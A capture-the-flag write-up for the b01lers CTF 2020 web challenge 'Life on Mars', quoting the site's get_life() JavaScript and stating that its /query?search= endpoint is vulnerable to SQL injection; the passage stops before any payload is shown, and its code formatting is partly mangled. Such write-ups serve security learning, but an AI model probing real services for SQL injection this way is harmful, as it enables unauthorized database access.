<h1>b01lers CTF 2020 â€“ Life on Mars</h1>

<ul>
<li><strong>Category:</strong> web</li>

<h2>Challenge</h2>

<blockquote>
  <p>We earth men have a talent for ruining big, beautiful things.</p>
  
  <p>http://web.ctf.b01lers.com:1001/</p>
</blockquote>

<h2>Solution</h2>

<p>The left menu of the webpage is made up of items calling <code>get_life()</code> JavaScript method contained into <code>http://web.ctf.b01lers.com:1001/static/js/life_on_mars.js</code> file.</p>

<p>```javascript
function get_life(query) {
  //jquery ajax for querying server
  /*
  response = $.load('/query?search=' + query, function(responseTxt, statusTxt, xhr).parseJSON(response);
    {
    if (statusTxt == "success") {</p>

<pre><code>}
</code></pre>

<p>});</p>

<p>*/
  //alert(query);
  $.ajax({
    type: "GET",
    url: "/query?search=" + query,
    data: "{}",
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    cache: false,
    success: function(data) {
      var table<em>html =
        '<table id="results"><tr><th>Name</th><th>Description</th></tr>';
      $.each(data, function(i, item) {
        table</em>html +=
          "<tr><td>" + data[i][0] + "</td><td>" + data[i][1] + "</td></tr>";
      });
      table_html += "</table>";</p>

<pre><code>  $("#results").replaceWith(table_html);
},

error: function(msg) {
  //alert(msg.responseText);
}
</code></pre>

<p>});
}
```</p>

<p>This method receives a string in input and uses it to contact a remote service, i.e. <code>http://web.ctf.b01lers.com:1001/query?search=&lt;param&gt;</code> endpoint, where requests are done to retrieve data.</p>

<p>The remote service is vulnerable to SQL injection.</p>
